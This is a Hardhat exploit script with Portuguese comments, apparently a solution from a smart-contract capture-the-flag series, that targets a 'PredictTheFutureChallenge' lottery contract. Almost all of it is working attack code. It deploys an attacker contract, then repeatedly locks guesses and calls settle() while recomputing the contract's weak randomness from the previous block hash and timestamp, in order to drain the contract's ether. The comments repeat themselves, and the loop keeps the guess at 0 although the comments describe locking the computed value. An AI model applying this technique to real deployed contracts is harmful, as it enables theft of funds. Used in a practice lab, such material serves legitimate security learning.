const hre = require("hardhat");

async function main() {
  console.log("üîç Iniciando exploit do PredictTheFutureChallenge...\n");

  // O endere√ßo do contrato pode ser passado como vari√°vel de ambiente
  let contractAddress = process.env.CONTRACT_ADDRESS;
  
  if (!contractAddress) {
    console.log("üì¶ Nenhum endere√ßo fornecido. Fazendo deploy do contrato...\n");
    
    const [deployer] = await hre.ethers.getSigners();
    
    // Deploy do contrato enviando 1 ether
    const PredictTheFutureChallenge = await hre.ethers.getContractFactory("challenges/07_lottery_predict_future/contracts/PredictTheFutureChallenge.sol:PredictTheFutureChallenge");
    const challenge = await PredictTheFutureChallenge.deploy({
      value: hre.ethers.parseEther("1.0")
    });
    await challenge.waitForDeployment();
    contractAddress = await challenge.getAddress();
    
    console.log("‚úÖ Contrato deployado em:", contractAddress);
    console.log("");
  }

  // Conectar ao contrato
  const PredictTheFutureChallenge = await hre.ethers.getContractFactory("challenges/07_lottery_predict_future/contracts/PredictTheFutureChallenge.sol:PredictTheFutureChallenge");
  const contract = PredictTheFutureChallenge.attach(contractAddress);

  // Obter contas
  const [attacker] = await hre.ethers.getSigners();
  
  // Verificar estado antes do exploit
  const balanceBefore = await hre.ethers.provider.getBalance(contractAddress);
  const isCompleteBefore = await contract.isComplete();
  
  console.log("üìç Endere√ßo do contrato:", contractAddress);
  console.log("üë§ Atacante:", attacker.address);
  console.log("");
  console.log("üìä Estado antes do exploit:");
  console.log("  - Saldo do contrato:", hre.ethers.formatEther(balanceBefore), "ETH");
  console.log("  - Desafio completo:", isCompleteBefore);
  console.log("");

  if (isCompleteBefore) {
    console.log("‚úÖ O desafio j√° est√° completo!");
    return;
  }

  // Estrat√©gia: Como h√° apenas 10 possibilidades (0-9), vamos tentar fazer lock
  // com cada n√∫mero at√© encontrar um que corresponda ao n√∫mero gerado no bloco de settle
  
  console.log("üîç Deployando contrato atacante...\n");
  
  const Attacker = await hre.ethers.getContractFactory("challenges/07_lottery_predict_future/contracts/Attacker.sol:Attacker");
  const attackerContract = await Attacker.deploy(contractAddress);
  await attackerContract.waitForDeployment();
  const attackerAddress = await attackerContract.getAddress();
  
  console.log("‚úÖ Contrato atacante deployado em:", attackerAddress);
  console.log("");

  // Estrat√©gia: Continuar fazendo lock e settle() at√© esvaziar o contrato completamente
  // Como h√° apenas 10 possibilidades (0-9), eventualmente vamos acertar
  
  console.log("üéØ Fazendo lock e settle() at√© esvaziar o contrato...\n");
  
  let settled = false;
  let attempts = 0;
  const maxAttempts = 50; // Aumentar tentativas para garantir que esvaziamos o contrato
  
  while (!settled && attempts < maxAttempts) {
    attempts++;
    
    // Verificar saldo do contrato
    const currentBalance = await hre.ethers.provider.getBalance(contractAddress);
    if (currentBalance === 0n) {
      console.log("‚úÖ Contrato esvaziado!");
      settled = true;
      break;
    }
    
    console.log(`\nüîÑ Tentativa ${attempts} (saldo do contrato: ${hre.ethers.formatEther(currentBalance)} ETH)...`);
    
    try {
      // Estrat√©gia: Calcular qual n√∫mero ser√° gerado no pr√≥ximo bloco v√°lido ANTES de fazer lock
      // Quando fazemos lock no bloco N, settlementBlockNumber = N + 1
      // Quando chamamos settle() no bloco M (M > N + 1), o n√∫mero √© calculado usando:
      // - block.blockhash(block.number - 1) = hash do bloco M - 1
      // - now = timestamp do bloco M
      
      // Vamos minerar alguns blocos primeiro para ter blocos conhecidos
      const currentBlock = await hre.ethers.provider.getBlock("latest");
      
      // Minerar um bloco para ter um bloco anterior conhecido
      await attacker.sendTransaction({ to: attacker.address, value: 0 });
      const blockAfterMine = await hre.ethers.provider.getBlock("latest");
      
      // Calcular qual n√∫mero ser√° gerado no pr√≥ximo bloco (blockAfterMine.number + 1)
      // Este ser√° o bloco onde vamos chamar settle() ap√≥s fazer lock
      const targetSettleBlock = blockAfterMine.number + 1;
      
      // Para calcular o n√∫mero, precisamos do hash do bloco anterior (blockAfterMine.number)
      // e do timestamp do bloco targetSettleBlock
      // Mas n√£o sabemos o timestamp exato do bloco futuro, ent√£o vamos estimar
      // ou minerar at√© l√°
      
      // Estrat√©gia: Calcular qual n√∫mero ser√° gerado no pr√≥ximo bloco v√°lido ANTES de fazer lock
      // Vamos minerar at√© o bloco onde vamos fazer settle(), calcular o n√∫mero, e fazer lock com esse n√∫mero
      
      // Primeiro, vamos minerar alguns blocos para ter blocos conhecidos
      // Depois vamos calcular qual n√∫mero ser√° gerado no pr√≥ximo bloco
      // e fazer lock com esse n√∫mero
      
      // Minerar um bloco para ter um bloco anterior conhecido
      await attacker.sendTransaction({ to: attacker.address, value: 0 });
      const blockBeforeLock = await hre.ethers.provider.getBlock("latest");
      
      // Quando fazemos lock no bloco N, settlementBlockNumber = N + 1
      // Quando chamamos settle() no bloco M (M > N + 1), o n√∫mero √© calculado usando:
      // - block.blockhash(block.number - 1) = hash do bloco M - 1
      // - now = timestamp do bloco M
      
      // Vamos fazer lock agora, e depois minerar at√© o bloco de settle
      // e calcular o n√∫mero. Se n√£o corresponder, vamos fazer lock novamente com o n√∫mero correto
      
      // Mas como n√£o sabemos o timestamp exato do bloco futuro, vamos fazer lock primeiro
      // e depois calcular. Se n√£o corresponder, fazemos lock novamente com o n√∫mero correto
      
      // Fazer lock com um n√∫mero (vamos tentar todos se necess√°rio)
      const guess = 0;
      
      console.log(`üìù Fazendo lock com n√∫mero ${guess}...`);
      const lockTx = await attackerContract.lockInGuess(guess, {
        value: hre.ethers.parseEther("1.0")
      });
      await lockTx.wait();
      
      // Obter informa√ß√µes do bloco do lock
      const lockReceipt = await hre.ethers.provider.getTransactionReceipt(lockTx.hash);
      const lockBlock = await hre.ethers.provider.getBlock(lockReceipt.blockNumber);
      const settlementBlockNumber = lockBlock.number + 1;
      
      console.log(`   ‚úÖ Lock feito no bloco ${lockBlock.number}, settlement block: ${settlementBlockNumber}`);
      
      // Minerar blocos at√© podermos chamar settle()
      while (true) {
        const latestBlock = await hre.ethers.provider.getBlock("latest");
        if (latestBlock.number > settlementBlockNumber) {
          break;
        }
        // Minerar um bloco
        await attacker.sendTransaction({ to: attacker.address, value: 0 });
      }
      
      // Calcular o n√∫mero que ser√° gerado no bloco atual (onde vamos chamar settle())
      const settleBlock = await hre.ethers.provider.getBlock("latest");
      const prevBlock = await hre.ethers.provider.getBlock(settleBlock.number - 1);
      
      // Em Solidity 0.4.21, keccak256(block.blockhash(block.number - 1), now) concatena os dois valores
      const timestampBytes = hre.ethers.zeroPadValue(hre.ethers.toBeHex(settleBlock.timestamp), 32);
      const combined = hre.ethers.concat([prevBlock.hash, timestampBytes]);
      const hash = hre.ethers.keccak256(combined);
      const calculatedAnswer = parseInt(hash.slice(-2), 16) % 10;
      
      console.log(`   üìä Bloco para settle: ${settleBlock.number}, n√∫mero calculado: ${calculatedAnswer}`);
      
      if (calculatedAnswer === guess) {
        console.log(`   üéØ N√∫mero corresponde ao lock ${guess}! Chamando settle()...`);
        
        const settleTx = await attackerContract.trySettle();
        await settleTx.wait();
        console.log("   ‚úÖ Settle confirmado! Recebemos 2 ETH de volta.");
        
        // Verificar se o contrato foi esvaziado
        const balanceAfter = await hre.ethers.provider.getBalance(contractAddress);
        if (balanceAfter === 0n) {
          console.log("   ‚úÖ Contrato esvaziado completamente!");
          settled = true;
          break;
        }
      } else {
        // N√£o corresponde, vamos chamar settle() mesmo assim para resetar
        // e na pr√≥xima tentativa vamos fazer lock com o n√∫mero correto
        console.log(`   ‚ö†Ô∏è  N√∫mero n√£o corresponde (lock: ${guess}, calculado: ${calculatedAnswer}). Chamando settle() para resetar...`);
        try {
          const settleTx = await attackerContract.trySettle();
          await settleTx.wait();
          console.log("   ‚úÖ Settle chamado (resetou guesser). Na pr√≥xima tentativa, vamos fazer lock com o n√∫mero calculado.");
        } catch (error) {
          // Se falhar, continuar
          console.log("   ‚ö†Ô∏è  Settle falhou, continuando...");
        }
      }
    } catch (error) {
      console.log(`   ‚ùå Erro:`, error.message);
      // Se falhar no lock, pode ser que j√° tenha um lock ativo, tentar settle() primeiro
      try {
        await attackerContract.trySettle();
      } catch (e) {
        // Ignorar erro
      }
    }
  }

  // Verificar estado ap√≥s o exploit
  const balanceAfter = await hre.ethers.provider.getBalance(contractAddress);
  const isCompleteAfter = await contract.isComplete();
  
  console.log("\nüìä Estado ap√≥s o exploit:");
  console.log("  - Saldo do contrato:", hre.ethers.formatEther(balanceAfter), "ETH");
  console.log("  - Desafio completo:", isCompleteAfter);
  
  if (isCompleteAfter) {
    console.log("\nüéâ Desafio completado! O n√∫mero foi previsto e adivinhado corretamente");
    console.log("üí∞ Voc√™ recebeu 2 ether de volta (1 ether enviado + 1 ether de lucro)");
  } else {
    console.log("\n‚ùå Algo deu errado. O desafio n√£o foi completado.");
    console.log("üí° Tente executar novamente ou verifique os logs acima.");
  }
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });

